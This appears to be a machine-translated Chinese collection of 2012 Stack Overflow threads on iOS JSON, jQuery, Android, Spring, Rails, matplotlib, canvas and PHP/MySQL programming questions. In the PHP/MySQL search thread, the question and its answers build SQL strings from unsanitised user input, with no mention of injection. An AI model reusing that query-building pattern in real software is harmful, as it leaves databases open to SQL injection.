        "transaction" : 6,
        "username" : "TonyB"
    }
] 
```

然后，您可以以标准方式阅读此 JSON：

```
NSData *data = [NSData dataWithContentsOfURL:url];

NSError *error;
NSArray *jsonData = [NSJSONSerialization JSONObjectWithData:data options:0 error:&error]; 
```

最后，您的`cellForRowAtIndexPath`or`didSelectRowAtIndexPath`现在可以简单地执行以下操作：

```
NSDictionary *currentObject = jsonData[indexPath.row]; 
```

或者，如果您使用的 Xcode 版本早于 4.5 版，您会：

```
NSDictionary *currentObject = [jsonData objectAtIndex:indexPath.row]; 
```

# jquery - jquery + 循环遍历数据属性

> ID：13756969
> 
> 赞同：0
> 
> 时间：2012-12-07T04:34:45.843
> 
> 标签：jquery

我有许多带有 mainMenuInternalTab 类的 DIV

每个都有名为 data-pagename 的数据属性。

如何遍历此数据属性的所有实例以查看是否有一个设置了名称转换？

谢谢你

```
<div id="mainMenuInternalConversations" class="mainMenuInternalTab" data-pagename="conversations"></div>
<div id="mainMenuInternalConversations2" class="mainMenuInternalTab" data-pagename="conversations2"></div>
<div id="mainMenuInternalConversations3" class="mainMenuInternalTab" data-pagename="conversations3"></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:37:17.500

```
if (  
      $('.mainMenuInternalTab').filter(function() {
         return $(this).data('pagename') == 'conversations';
      }).length​
   ) {

         //do something if an element with the data attribute
         // pagename has a value of 'conversations'

     } 
```

或更简单的版本（但可能会慢一点）：

```
if ( $('.mainMenuInternalTab[data-pagename="conversations"]').length ) {
    //do something
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:37:06.780

您可以使用[each()](http://api.jquery.com/jQuery.each/)通过`iterate`带有 class 的元素`mainMenuInternalTab`。

```
$('.mainMenuInternalTab').each(function(){
   alert($(this).data('pagename'));
   if($(this).data('pagename') == "convsersions set")
   {
      // do what ever you want here.
   } 
}); 
```

# shell - 是否可以在没有root权限的情况下安装kakasi？

> ID：13756971
> 
> 赞同：0
> 
> 时间：2012-12-07T04:34:58.813
> 
> 标签：shell, root

工具[KAKASI](http://kakasi.namazu.org/) 用于将日文文本转换成对应的拼音字母。

我正在尝试使用源代码中的 .rpm 或其他构建指南进行安装，所有这些都安装在`root`目录中，

因为我在与 Bluehost 的共享服务器上，所以我无权在那里安装。

因此，显然运行 rpm 或遵循这些步骤只会导致权限错误。

有没有办法在 HTML 公共目录中安装这个工具？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T08:06:54.530

如果您从[此处](http://kakasi.namazu.org/)（当前`kakasi-2.3.4.tar.gz`）下载源代码 .tar.gz，您可以从源代码编译并安装到您想要的任何位置。

在下文中，我将使用`$KAKASI_DIR`来指代您要安装它的目录。

```
?> tar xfvz kakasi-2.3.4.tar.gz
?> cd kakasi-2.3.4
?> configure --prefix $KAKASI_DIR
?> make
?> make install 
```

在每个步骤之后检查是否有任何错误消息。我刚刚在 Fedora 17 上运行了该过程，没有出现任何问题，但如果您遇到任何错误，很可能与缺少依赖项有关。与 不同`rpm`的是，从源代码构建意味着您需要确保在开始安装之前安装了所有依赖项。

# mysql - 如何使用 pentaho 设计器传递日期参数？

> ID：13756976
> 
> 赞同：0
> 
> 时间：2012-12-07T04:35:07.687
> 
> 标签：mysql, pentaho, pentaho-design-studio

我有问题如何在报告中传递参数日期字段数据库。

我已经设置了这样的参数：- `X.createDate= ${datetim}`在 MySql 中。

我还把参数设置放在了pentaho Designer中。当我运行报告时。结果没有出现。以下是报告中参数设置的屏幕截图：-

![在此处输入图像描述](../Images/90bc52faae514a80901146045caca5a4.png)

有人知道这件事吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T14:31:00.103

您对参数设置查询。如果参数有查询，查询的结果将用作验证源。将检查任何提供的参数值，并且仅当在该结果集中找到它时才接受。

第一：将参数标记为必填，以便在报告引擎认为您的参数无效时通知您。

第二：日期选择器实际上并不指示哪些值有效或无效。因此，如果您确实只想根据数据库中的可用日期选择参数，我建议不要使用日期选择器。请改用下拉菜单。

# android - 某些运行 Jelly Bean/4.2.1 的设备的 Android 操作系统错误 - TextView.setError(CharSequence error) 缺少图标

> ID：13756978
> 
> 赞同：35
> 
> 时间：2012-12-07T04:35:24.580
> 
> 标签：android, android-edittext, textview, android-4.2-jelly-bean

`TextView`一些（但不是全部）运行 Jelly Bean ( 4.2.1) 的设备似乎缺少感叹号错误图标，该图标应该出现在`EditText`通过[`TextView.setError(CharSequence error)`](https://developer.android.com/reference/android/widget/TextView.html#setError(java.lang.CharSequence)).

![在此处输入图像描述](../Images/b084cfc9611baf22e1935e4a516112c1.png) ![在此处输入图像描述](../Images/ade6874d7e10284987ffbe1338996d10.png)

Galaxy Nexus 似乎确实缺少该图标。

效果是设置的错误状态仅在具有焦点`setError`时才明显。`EditText`这使得`setError(...)`它的用处大大降低，因为它通常用于鼓励用户返回`EditText`解决问题。例如，您有一个标准登录屏幕，其中包含在用户单击提交按钮时验证的用户名和密码表单条目。除非用户单击返回该表单，否则不会显示在用户名表单上设置的验证错误消息——这是错误图标旨在鼓励他们这样做的！

测试：（可能有一个更容易访问的 EditText，但这个是非常广泛可用的）

1.  打开设置
2.  选择“添加帐户”（在旧设备上的“帐户和同步”中）
3.  选择“Google”作为帐户类型
4.  选择“现有”（在旧设备上单击“下一步”和“登录”后）
5.  将“电子邮件”`EditText`留空，点击“密码”`EditText`

此时，“电子邮件”上设置了一个错误，`EditText`说明它不能为空白。在没有此问题的设备上，会显示通常的错误图标，当获得`EditText`焦点时，该图标会扩展为完整的错误消息。`EditText`在运行 Jelly Bean 的 Galaxy Nexuses 上，不显示任何图标，并且该错误仅在“电子邮件”再次获得焦点时才可见，并且此时仍然缺少图标。

这看起来像一个错误，但我想检查其他人是否可以重现它，对问题可能是什么有想法，并有一个好的解决方法。

使用[`setError(CharSequence error, Drawable icon)`](https://developer.android.com/reference/android/widget/TextView.html#setError%28java.lang.CharSequence,%20android.graphics.drawable.Drawable%29)可能会解决问题，但能够在不同的 Android 版本中使用库存错误图形会很好。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-01-05T19:42:22.050

**临时解决方案！`EditTextErrorFixed.java`**

虽然这确实是一个 SDK 错误，但我已经设法使用反射方法让图标按预期工作。我检查了它是否适用于 4.2 和 4.2.1，并确认它适用于我更新的 Galaxy Nexus。

来源可以在[这里找到。](https://github.com/OlegVaskevich/JB-showError-fixed/)

`EditTextErrorFixed`屏幕截图显示，即使焦点发生变化，底部的图标仍然存在。此外，它还包含另一个修复程序，如果用户在已经为空`EditText`的情况下按 Delete，错误就会消失（另一个错误？）。

![演示图片](../Images/81ea8e060ca0a90cbaf034223a169d8f.png)

为方便起见，这里是`EditTextErrorFixed`来源；该类可以很容易地在 XML 中使用：

```
package com.olegsv.showerrorfixeddemo;

import android.content.Context;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.view.KeyEvent;
import android.widget.EditText;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * EditText which addresses issues with the error icon
 * (http://stackoverflow.com/q/13756978/832776) and also the error icon
 * disappearing on pressing delete in an empty EditText
 */
public class EditTextErrorFixed extends EditText {
    public EditTextErrorFixed(Context context) {
        super(context);
    }

    public EditTextErrorFixed(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public EditTextErrorFixed(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }

    /**
     * Don't send delete key so edit text doesn't capture it and close error
     */
    @Override
    public boolean onKeyPreIme(int keyCode, KeyEvent event) {
        if (TextUtils.isEmpty(getText().toString()) && keyCode == KeyEvent.KEYCODE_DEL)
            return true;
        else
            return super.onKeyPreIme(keyCode, event);
    }

    /**
     * Keep track of which icon we used last
     */
    private Drawable lastErrorIcon = null;

    /**
     * Resolve an issue where the error icon is hidden under some cases in JB
     * due to a bug http://code.google.com/p/android/issues/detail?id=40417
     */
    @Override
    public void setError(CharSequence error, Drawable icon) {
        super.setError(error, icon);
        lastErrorIcon = icon;

        // if the error is not null, and we are in JB, force
        // the error to show
        if (error != null /* !isFocused() && */) {
            showErrorIconHax(icon);
        }
    }

    /**
     * In onFocusChanged() we also have to reshow the error icon as the Editor
     * hides it. Because Editor is a hidden class we need to cache the last used
     * icon and use that
     */
    @Override
    protected void onFocusChanged(boolean focused, int direction, Rect previouslyFocusedRect) {
        super.onFocusChanged(focused, direction, previouslyFocusedRect);
        showErrorIconHax(lastErrorIcon);
    }

    /**
     * Use reflection to force the error icon to show. Dirty but resolves the
     * issue in 4.2
     */
    private void showErrorIconHax(Drawable icon) {
        if (icon == null)
            return;

        // only for JB 4.2 and 4.2.1
        if (android.os.Build.VERSION.SDK_INT != Build.VERSION_CODES.JELLY_BEAN &&
                android.os.Build.VERSION.SDK_INT != Build.VERSION_CODES.JELLY_BEAN_MR1)
            return;

        try {
            Class<?> textview = Class.forName("android.widget.TextView");
            Field tEditor = textview.getDeclaredField("mEditor");
            tEditor.setAccessible(true);
            Class<?> editor = Class.forName("android.widget.Editor");
            Method privateShowError = editor.getDeclaredMethod("setErrorIcon", Drawable.class);
            privateShowError.setAccessible(true);
            privateShowError.invoke(tEditor.get(this), icon);
        } catch (Exception e) {
            // e.printStackTrace(); // oh well, we tried
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-26T17:30:08.797

我知道这里已经有解决方案。它只是我试图不惜一切代价避免在Android上的反射。如果您对反射没问题，请先尝试下面的解决方案，因为它可能会解决问题而无需子类化和反射。

```
Drawable d= getResources().getDrawable(R.drawable.ic_launcher);
            d.setBounds(0, 0, 
                    d.getIntrinsicWidth(), d.getIntrinsicHeight());

            et.setError("my error",d); 
```

# java - 使用 Spring IOC (DI) 解决“机器人腿”p‌r‌o‌b‌l‌e‌m

> ID：13756979
> 
> 赞同：1
> 
> 时间：2012-12-07T04:35:25.613
> 
> 标签：java, spring, dependency-injection, ioc-container, guice

使用 Guice，可以执行以下操作：

```
interface Leg {} 
```

_

```
class LeftLeg implements Leg {
    public String toString() {
        return "LeftLeg";
    }
} 
```

_

```
class RightLeg implements Leg {
    public String toString() {
        return "RightLeg";
    }
} 
```

_

```
class Robot {
    final Leg leftLeg_;
    final Leg rightLeg_;

    @Inject
    Robot(@Named("left") Leg leftLeg, @Named("right") Leg rightLeg) {
        leftLeg_ = leftLeg;
        rightLeg_ = rightLeg;
    }

    public String toString() {
        return "leftLeg_=" + leftLeg_ + ", rightLeg_=" + rightLeg_;
    }
} 
```

_

```
class RobotTest {
    @Test
    public void t1() throws Exception {
        Injector inj = Guice.createInjector(new AnGuiceModule());
        Robot r = inj.getInstance(Robot.class);
        assertEquals(r.toString(), "leftLeg_=LeftLeg, rightLeg_=RightLeg");
    }
} 
```

_

```
class AnGuiceModule extends AbstractModule {
    protected void configure() {
        bind(Leg.class).annotatedWith(Names.named("left")).to(LeftLeg.class);
        bind(Leg.class).annotatedWith(Names.named("right")).to(RightLeg.class);
    }
} 
```

在不使用 XML 配置的情况下，如何使用 JSR-330（可选）注释和 JavaConfig 使用 Spring 3.x（3.1.x 或 3.2）实现相同的目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:52:00.110

`interface Leg {}`

_

```
 @Component
 class LeftLeg implements Leg {
  public String toString() {
    return "LeftLeg";
  }
 } 
```

_

```
@Component
class RightLeg implements Leg {
  public String toString() {
    return "RightLeg";
 }
} 
```

_

```
class Robot {
  @Autowired
  Leg leftLeg_;
  @Autowired
  Leg rightLeg_;

  public String toString() {
    return "leftLeg_=" + leftLeg_ + ", rightLeg_=" + rightLeg_;
 }
} 
```

_

```
@RunWith(SpringJUnit4ClassRunner.class)
class RobotTest {
  @Autowired
  Robot r;
  @Test
  public void t1() throws Exception {
     System.out.println(r);
 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T08:09:12.423

你可以这样做；虽然这个使用了 Spring 注释、@Qualifier 和 @Autowired，但我看不出它不能与 @Named 和 @Inject 一起使用的任何理由，你应该尝试：

```
public class MovieRecommender {

  private MovieCatalog movieCatalog;
  private CustomerPreferenceDao customerPreferenceDao;

  @Autowired
  public void prepare(@Qualifier("main") MovieCatalog movieCatalog,
                      CustomerPreferenceDao customerPreferenceDao) {
      this.movieCatalog = movieCatalog;
      this.customerPreferenceDao = customerPreferenceDao;
  }

  // ...
} 
```

示例取自[参考资料](http://static.springsource.org/spring/docs/3.1.3.RELEASE/spring-framework-reference/html/beans.html#beans-autowired-annotation-qualifiers)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-09T03:16:24.213

我能找到的最接近的是（Robot 和 Leg* 类的定义没有改变）：

```
public class RobotTest {

    @Test
    public void t1() throws Exception {
        ApplicationContext ctx = new 
               AnnotationConfigApplicationContext(RobotConfig.class, Robot.class);
        Robot r = ctx.getBean(Robot.class);
        assertEquals("leftLeg_=LeftLeg, rightLeg_=RightLeg", r.toString());
    }
}

@Configuration
class RobotConfig {

    @Bean
    public Leg leftLeg() {
        return new LeftLeg();
    }

    @Bean
    public Leg rightLeg() {
        return new RightLeg();
    }

} 
```

替代方案是：

```
public class RobotTest {

    @Test public void t1() throws Exception {
        ApplicationContext ctx = new 
               AnnotationConfigApplicationContext(RobotConfig.class);
        Robot r = ctx.getBean(Robot.class);
        assertEquals("leftLeg_=LeftLeg, rightLeg_=RightLeg", r.toString());
    }
}

@Configuration
class RobotConfig {

   @Bean @Scope("prototype") public Robot robot() {
       return new Robot(leftLeg(), rightLeg());
   }

    @Bean @Scope("prototype") public Leg leftLeg() {
        return new LeftLeg();
    }

    @Bean @Scope("prototype") public Leg rightLeg() {
        return new RightLeg();
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-12-04T14:57:03.243

[spring 论坛](http://forum.spring.io/forum/spring-projects/container/13533-exporting-child-applicationcontext-beans-to-the-parent-applicationcontext)上描述了一种有趣的方法。您需要以某种方式获取对子上下文的引用，我不喜欢那里提出的方法，但我应该有其他方法。

用法：

```
 <bean name="someBean" class="playground.spring.BeanImportFactoryBean">
        <property name="applicationContext" ref="privateCtx"/>
        <property name="importBeanName" value="importBean"/>
    </bean> 
```

工厂豆代码：

```
public class BeanImportFactoryBean implements FactoryBean, BeanNameAware {
    transient private final Log log = LogFactory.getLog(this.getClass());

    private String beanName;
    private ApplicationContext applicationContext;
    private String importBeanName;

    public BeanImportFactoryBean() {
    }

    public void setBeanName(String beanName) {
        this.beanName = beanName;
    }

    public void setApplicationContext(ApplicationContext applicationContext) {
        this.applicationContext = applicationContext;
    }

    public void setImportBeanName(String importBeanName) {
        this.importBeanName = importBeanName;
    }

    protected String getUsedBeanName() {
        String returnName;
        if (importBeanName == null) {
            returnName = beanName;
        } else {
            returnName = importBeanName;
        }
        return returnName;
    }

    public Object getObject() throws Exception {
        return this.applicationContext.getBean(getUsedBeanName());
    }

    public Class getObjectType() {
        return this.applicationContext.getType(getUsedBeanName());
    }

    public boolean isSingleton() {
        return this.applicationContext.isSingleton(getUsedBeanName());
    }
} 
```

# html - HTML5画布绘图坐标系统问题

> ID：13756982
> 
> 赞同：0
> 
> 时间：2012-12-07T04:35:42.167
> 
> 标签：html, html5-canvas

我试图在画布中创建矩形，我对画布的坐标系有点困惑

```
 <!doctype html>

<html lang="en">
<head>
    <meta charset="utf-8" />
    <title>jQuery UI Dialog - Modal form</title>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
    <style>
        body{
        background-color:  #231F20;    
        }
        #ribbonid{
            width:90px;
            height: 90px;
        }
    </style>    
</head>
<body> 
<canvas id='ribbonid' > </canvas> 
<script>
    $(document).ready(function(){
var $ribbonid = $('#ribbonid');
 // get the canvas element using the DOM
  var canvas = document.getElementById('ribbonid');

  // Make sure we don't execute when canvas isn't supported
  if (canvas.getContext){

    // use getContext to use the canvas for drawing

    var cts = canvas.getContext('2d');

    cts.fillStyle   = '#f7911e';   

    cts.beginPath();
    cts.moveTo(0, 0);
    cts.lineTo(90, 0);
    cts.lineTo(90, 90);
    cts.lineTo(0, 90);
    cts.lineTo(0, 0);
    cts.fill();    
    cts.closePath();    
  }        
    });

</script>
</body>
</html> 
```

[http://jsfiddle.net/bkf2e/](http://jsfiddle.net/bkf2e/)

我知道 canvas.rect 功能，但我需要为我创建一些不同的形状。我创建了大小为（90,90）（正方形）的矩形，但它正在创建完整的正方形。 ![在此处输入图像描述](../Images/8cdd9438eaf4087f24f651e2346ab7e7.png)

我知道这可能是我的简单错误，但你能帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T04:42:21.260

您需要使用 width 和 height 属性设置画布的大小，如果您使用 css 来调整它的大小，那么它将缩放默认大小而不是成为您想要的大小，这就是它被这样扭曲的原因。

我已经用属性集更新了你的 jsfiddle，你会看到它现在是方形的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:44:09.063

解决了问题，

这是宽度和高度属性的愚蠢错误

```
<canvas id='ribbonid' width='90' height='90' > </canvas> 
```

# c# - API - 状态响应

> ID：13756984
> 
> 赞同：0
> 
> 时间：2012-12-07T04:36:11.323
> 
> 标签：c#, web-services, api, architecture

关于 Web 服务 API，

您（开发人员）执行“GetPhoneNumberList”并且用户尚未向其帐户添加电话号码，您是否希望 API 响应状态 =“成功”或“失败”？

不会返回任何记录，因为没有可返回的内容。

（我希望状态是成功的，因为它不是开发人员的错）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T05:08:57.400

根据您提供的信息，我可以发表意见，但由于我不了解所有细节，因此不是很明智。

仅从您的方法名称来看，我断定您正在编写一个用于检索的 API。如果我打电话`GetPhoneNumberList`，我希望收到某种包含零个或多个项目的序列。因此，您可以成功检索零个电话号码似乎是完全合理的。否则，我如何区分未设置电话号码的用户与检索电话号码时出现程序/网络/数据库/安全/等错误？

# ruby-on-rails - 如何在 Rails 中将目录加载列入黑名单？

> ID：13756986
> 
> 赞同：8
> 
> 时间：2012-12-07T04:36:42.930
> 
> 标签：ruby-on-rails, ruby, gem, dependencies, activeadmin

我想在运行测试时禁用 ActiveAdmin。

所以我添加`require: false`到 Gemfile 并检查`if defined?(ActiveAdmin)`路由和初始化程序。

但是 Rails 仍然加载模型表单`app/admin`，因此我收到类似于`/app/admin/admin_user.rb:1:in`“：未初始化的常量 ActiveAdmin (NameError)”的错误

`app/admin`将加载目录“列入黑名单”的最佳方法是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-07T08:52:15.987

```
# config/environments/test.rb

path_rejector = lambda { |s| s.include?("app/admin") }

# Remove the path from being loaded when Rails starts:
config.eager_load_paths = config.eager_load_paths.reject(&path_rejector)

# Remove the path from being lazily loaded
ActiveSupport::Dependencies.autoload_paths.reject!(&path_rejector) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T07:04:58.890

在 config/application.rb 添加：

```
config.paths.delete("app/admin")
new_eager_load_paths = config.eager_load_paths.dup
new_eager_load_paths.delete("/mnt/hgfs/project/app/admin")
config.eager_load_paths = new_eager_load_paths 
```

您必须用您的路径替换“/mnt/hgfs/project/eventmust/app/admin”，它不是很干净，但它可以工作。

# python - python的保存图按钮在mac中不起作用，尝试解决不成功，怎么办？

> ID：13756988
> 
> 赞同：4
> 
> 时间：2012-12-07T04:36:50.493
> 
> 标签：python, macos, matplotlib, enthought

我昨天将我的 python 发行版更新为 EPD 7.3-2（64 位）。我正在使用带有雪豹的Mac。现在 matplotlib 的绘图设备至少在两个方面被破坏：

1.  “保存”按钮不起作用并使终端或`ipython`崩溃和
2.  看到该图的唯一方法是将它放在您面前，Dock 中没有蟒蛇图图标。

我做了功课，[在这里](https://stackoverflow.com/questions/8998159/how-to-link-matplotlib-plots-to-a-cocoa-recognized-icon-or-application-in-lion)和[这里](https://stackoverflow.com/questions/3692928/why-doesnt-the-save-button-work-on-a-matplotlib-plot)都报告了同样的问题。

我尝试按照[此处](https://groups.google.com/forum/?fromgroups=#!topic/python-virtualenv/g_pKEtIqMMg)给出的说明解决此问题，但这是我得到的错误：

```
$python install_pythonw.py `which python`/../..
/Library/Frameworks/EPD64.framework/Versions/Current/.Python does not exist; exiting. 
```

确实，我查看了给定的文件夹，但找不到`.Python`文件。我在这个问题的答案中添加了一条评论，但到目前为止没有人回复它:( :( 知道如何解决这个问题吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T06:35:49.303

这个问题我见过几次，在某些后端似乎是个问题。此外，您的会话在 4 或 5 次绘图后崩溃似乎并不正常。特别是，`MacOSX`后端似乎有问题。

当您安装 EPD 时，我认为您的安装损坏的可能性较小。该解决方案似乎使用了[不同的后端](https://stackoverflow.com/questions/3285193/how-to-switch-backends-in-matplotlib-python)。您可以尝试`ipython --pylab`一些后端，尝试它们的功能并查看保存按钮是否有效。您可以尝试以下方法：

```
ipython --pylab=wx
ipython --pylab=tk
ipython --pylab=osx 
```

最后一个是您现在可能正在使用的选项，因此可能不是最好的。如果您只是调用`ipython --pylab`，它将使用您`~/.matplotlib/matplotlibrc`文件中的默认后端。找到工作后端后，您可以通过编辑该文件来更改默认值。寻找这样的一行：

```
backend      :  MacOSX 
```

（您的版本可能有不同的后端。）只需将该设置更改为`WXAgg`、`TkAgg`或`Qt4Agg`。使用该`--pylab`选项，名称略有不同，它们没有该`Agg`部分。我最喜欢的 OSX 后端是`Qt4Agg`后端，但我认为它不随 EPD 一起提供，并且保存按钮也不起作用！但要么`WXAgg`或`TkAgg`应该工作正常。

在脚本中更改后端的其他方法是：

```
import matplotlib
matplotlib.use('WXAgg') 
```

或者

```
matplotlib.rcParams['backend'] = 'WXAgg' 
```

# php - mysql AND 语句

> ID：13756989
> 
> 赞同：1
> 
> 时间：2012-12-07T04:36:57.597
> 
> 标签：php, mysql, match, where-clause, sql-like

我正在尝试在我的数据库中搜索“产品”、“描述”和“关键字”列。问题是，当我在表格的“描述”或“关键字”列中输入一个单词时，而不是在“产品”列中，它不会显示该结果。如果我在表格的“产品”列中键入一个单词，它只会显示结果。

我不确定 AND 语句是否在做我想要的。我想在这 3 列中搜索与用户搜索“类似”的单词，并按相关性对结果进行排序。任何帮助，将不胜感激。

```
$search_exploded = explode(" ",$searchquery);

foreach($search_exploded as $search_each)
{
    $x++;
    if ($x==1)
        $construct .= "product LIKE '%$search_each%' AND description LIKE '%$search_each%' AND keywords LIKE '%$search_each%'";
    else
        $construct .= " OR product LIKE '%$search_each%' AND description LIKE '%$search_each%' AND keywords LIKE '%$search_each%'";
}

$sqlCommand = "SELECT * FROM Search WHERE $construct ORDER BY MATCH (product,description,keywords) AGAINST ('$searchquery') DESC"; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T04:41:48.717

*我想在这 3 列中搜索单词*

所以你需要使用`OR`而不是`AND`：

```
product LIKE '%$search_each%' OR description LIKE '%$search_each%' OR keywords LIKE '%$search_each%' 
```

如果用户搜索的单词在三列中的任何一列中，这将显示结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:50:09.553

当我做这种事情时，我喜欢拆分我的逻辑，然后使用`implode()`. 就像是：

```
$searchTerms = explode(" ",$searchquery);

$clauses = array();

foreach ($searchTerms as $searchTerm)
{
    $subClauses = array();
    $columns = array("product", "description", "keywords");
    foreach ($columns as $column)
    {
        $subClauses[] = " $column LIKE '%$searchTerm%' ";
    }

    $clauses[] = "(" . implode(" OR ", $subClauses) . ")";
}

$query = implode(" AND ", $clauses); 
```

我发现这样的逻辑更容易理解。在这里，我们是说：对于每个搜索词，必须在`product`列或`description`列或列中找到匹配项`keywords`。

这是在行动：[http ://eval.in/4335](http://eval.in/4335)

# android - 为什么我应该在 Android 中使用 Fragment？

> ID：13756999
> 
> 赞同：11
> 
> 时间：2012-12-07T04:37:42.153
> 
> 标签：android, android-fragments, apk

很长一段时间以来，我认为如果我只是开发应用程序`Android Phone`而不是在Android中使用Fragment是什么原因`10.1`。

有必要使用片段吗？另外，片段的用途是什么，我发现它可能用于“选项卡”和“单独视图”...

我真的认为这很混乱。任何人都可以简要解释并举例说明吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-07T05:06:39.870

从文档

> 您可以将片段视为活动的模块化部分，它有自己的生命周期，接收自己的输入事件，并且可以在活动运行时添加或删除（有点像“子活动”，您可以**在不同的活动中重用**）。

一些优点是..

1.  一个特定的 UI 部分，一旦在片段中完成，就可以在相同/不同的活动中重用。
2.  您可以分隔 UI 的不同部分，因此代码将整洁且易于阅读。

当您为不同类型的 android 设备（手机、平板电脑）创建应用程序时，片段能够重用的能力非常有用。一个设计良好的片段可以插入到您的 UI 层次结构中。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-12-06T07:57:06.477

Fragments 是 3.0 版本引入的一个新概念。

片段的基本目的是：

1.  片段旨在有效地使用设备 UI 空间。当你在 android 中编写应用程序时，有些人可以将其下载到手机中，有些人可以下载到平板电脑中。如果你看到平板电脑的空间，它会比手机大一点。您应该能够有效地使用该空间。但是你不能一直编写不同的应用程序，一个针对手机，另一个针对平板电脑。为了有效地做到这一点，即只编写能够很好地适应所有屏幕尺寸的应用程序，我们使用片段概念。

2.  片段被设计为多个活动之间的可重用 UI 组件。一旦你设计了一个片段，你就可以将它视为一个可拆卸的独立单元，这样你就可以将它插入到任何有空间的活动中。这意味着您可以重用为片段设计的代码。

您可以将 Fragment 视为一个子活动，它位于活动中，并将其自己的 UI 贡献给活动屏幕。片段总是活动的一部分。没有活动，片段将不存在。所以你的fragment生命周期总是会受到activity生命周期的影响。一个活动可以包含多个片段。类似地，一个片段可以在多个活动中重复使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T04:42:09.903

如果您在应用程序中使用 Fragment，您的应用程序将支持所有设备，如小型设备、平板电脑甚至 google TV。在一个`.apk`文件中，我们将为各种设备提供不同的设计。

这是我找到的最好的 Android 教程。第 21 节涵盖片段

参考[这里](http://www.vogella.com/articles/Android/article.html#fragments)